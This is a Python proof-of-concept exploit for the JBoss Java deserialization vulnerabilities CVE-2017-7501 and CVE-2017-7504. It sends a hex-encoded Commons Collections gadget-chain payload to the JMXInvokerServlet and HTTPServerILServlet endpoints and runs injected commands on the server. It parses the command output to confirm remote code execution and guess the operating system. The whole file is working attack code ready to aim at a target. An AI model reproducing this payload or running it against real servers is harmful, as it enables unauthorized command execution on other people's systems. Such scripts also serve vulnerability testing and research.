#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import re
import binascii
import random

payload_start = [
    "aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b7870737200316f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e5472616e73666f726d65644d617061773fe05df15a700300024c000e6b65795472616e73666f726d657274002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b4c001076616c75655472616e73666f726d657271007e00057870707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000b6e6577496e7374616e6365757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd02000078707400096765744d6574686f647571007e001900000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00197371007e00117571007e001600000002707571007e0016000000017571007e001b000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f7269747971007e00134c000466696c6571007e00134c0004686f737471007e00134c000870726f746f636f6c71007e00134c000372656671007e00137870ffffffffffffffff7074000b7574696c3233332e6a617274000074000466696c657078740006696e766f6b657571007e001900000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00167371007e00117571007e0016000000017400106a632e7574696c2e436f6d6d5574696c7400096c6f6164436c6173737571007e00190000000171007e00207371007e00117571007e0016000000027400046d61696e7571007e001900000001767200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787071007e001d7571007e00190000000271007e002071007e00217371007e00117571007e001600000002707571007e0016000000017571007e003900000004740004646174617400072d616374696f6e74000672756e636d647400"

]
payload_end = "71007e002b7571007e00190000000271007e002e71007e002f737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c7708000000100000000174000576616c756574000d646f65732774206d617474657278787672001b6a6176612e6c616e672e616e6e6f746174696f6e2e54617267657400000000000000000000007870"
ran_a = random.randint(10000000, 20000000)
ran_b = random.randint(1000000, 2000000)
ran_check = ran_a - ran_b
command = [
    'print goop',
    'expr %s - %s' % (ran_a, ran_b),
]
paths = [
    '/jbossmq-httpil/HTTPServerILServlet',  # CVE-2017-7504
    '/invoker/JMXInvokerServlet',  # CVE-2017-7501
]
check = [ran_check, '无法初始化设备 PRN', '??????? PRN', 'Unable to initialize device PRN', 'PRN']


def build_command_hex(comm):
    command_exec_hex = "".join("{:02x}".format(ord(c)) for c in comm)
    command_len = len(comm)
    command_len_hex = '{:02x}'.format(command_len)
    command_hex = command_len_hex + command_exec_hex
    # print(command_hex)
    return command_hex


def poc(url):
    proxies = {'http': '127.0.0.1:9999'}
    result = '目标Jboss存在JAVA反序列化漏洞,CVE-2017-7501/CVE-2017-7504 : %s' % url
    for start in payload_start:
        for cmd in command:
            for path in paths:
                payload = binascii.unhexlify(start + build_command_hex(cmd) + payload_end)
                payload_url = "%s%s" % (url, path)
                try:
                    req = requests.post(payload_url, data=payload, verify=False, timeout=6, )
                    res = re.search(b'--TAT--(.*?)--CGC--', req.content, re.DOTALL)

                    if res:
                        ooxx = (res.group(1)).decode('utf-8').strip('\r')
                        # print(ooxx)
                        for c in check:
                            if str(c) in str(ooxx):
                                if 'PRN' in str(ooxx):
                                    return result + ' [Windows OS]'
                                else:
                                    return result + ' [Linux OS]'
                except:
                    pass


if __name__ == "__main__":
    a = poc('http://192.168.106.130:8080')
    print(a)
